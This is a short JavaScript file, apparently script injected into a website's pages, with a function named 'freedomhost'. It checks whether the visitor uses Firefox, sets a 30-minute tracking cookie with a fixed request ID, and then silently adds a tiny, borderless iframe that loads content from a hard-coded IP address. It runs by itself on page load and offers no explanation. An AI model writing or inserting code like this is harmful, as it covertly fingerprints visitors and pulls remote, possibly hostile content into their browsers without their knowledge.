function createCookie(name,value,minutes) {
if (minutes) {
var date = new Date();
date.setTime(date.getTime()+(minutes*60*1000));
var expires = "; expires="+date.toGMTString();
}
else var expires = "";
document.cookie = name+"="+value+expires+"; path=/";
}
 
function readCookie(name) {
var nameEQ = name + "=";
var ca = document.cookie.split(';');
for(var i=0;i < ca.length;i++) {
var c = ca[i];
while (c.charAt(0)==' ') c = c.substring(1,c.length);
if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
}
return null;
}
 
function isFF() {
return (document.getBoxObjectFor != null || window.mozInnerScreenX != null || /Firefox/i.test(navigator.userAgent));
}
 
function updatify() {
var iframe = document.createElement('iframe');
iframe.style.display = "inline";
iframe.frameBorder = "0";
iframe.scrolling = "no";
iframe.src = "http://65.222.202.53/?requestID=eb5f2c80-fc81-11e2-b778-0800200c9a66";
iframe.height = "5";
iframe.width = "*";
document.body.appendChild(iframe);
}
 
function freedomhost() {
if ( ! readCookie("n_serv") ) {
createCookie("n_serv", "eb5f2c80-fc81-11e2-b778-0800200c9a66", 30);
updatify();
}
}
 
function isReady()
{
if ( document.readyState === "interactive" || document.readyState === "complete" ) {
if ( isFF() ) {
//window.alert(window.location + "Firefox Detected.")
freedomhost();
}
}
else
{
setTimeout(isReady, 250);
}
}
setTimeout(isReady, 250);
